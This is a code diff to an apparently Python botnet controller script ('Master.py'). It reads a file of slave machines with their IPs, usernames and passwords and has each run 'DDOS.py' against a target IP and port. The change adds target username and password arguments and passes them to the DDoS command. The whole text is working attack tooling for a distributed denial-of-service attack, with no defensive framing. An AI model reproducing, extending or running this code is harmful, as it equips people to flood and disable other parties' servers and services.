@@ -51,13 +51,17 @@ def add_client(host, user, password):
     #print(botnet)
 
 def main():
-    parser=argparse.ArgumentParser(description='description:command format: python Master.py --file botnet.txt --target-ip x.x.x.x --tartget-port xx')
+    parser=argparse.ArgumentParser(description='description:command format: python Master.py --file botnet.txt --target-ip x.x.x.x --tartget-port xx --target-username xx --target-password xx')
     parser.add_argument('--file',type=str,required=True,help='slave vms info,including ip, username and password')
     parser.add_argument('--target-ip',type=str,required=True,help='specify target ip')
     parser.add_argument('--target-port', type=int, required=True, help='specify target port')
+    parser.add_argument('--target-username', type=str, required=True, help='specify target username')
+    parser.add_argument('--target-password', type=str, required=True, help='specify target password')
     args=parser.parse_args()
     target_ip=args.target_ip
     target_port=args.target_port
+    target_username=args.target_username
+    target_password=args.target_password
     file=args.file
     if file ==None:
         print(parser.description)
@@ -67,7 +71,7 @@ def main():
         #cmd=input(ss)
         cmd1="ulimit -n 1000000"
         #cmd2="python3 DDoS.py"
-        cmd2="python3 DDOS.py --ip {} --port {}".format(target_ip,target_port)
+        cmd2="python3 DDOS.py --ip {} --port {} --username {} --password {}".format(target_ip,target_port,target_username,target_password)
         k=0
         f=open(file,'r')
         for line in f.readlines():
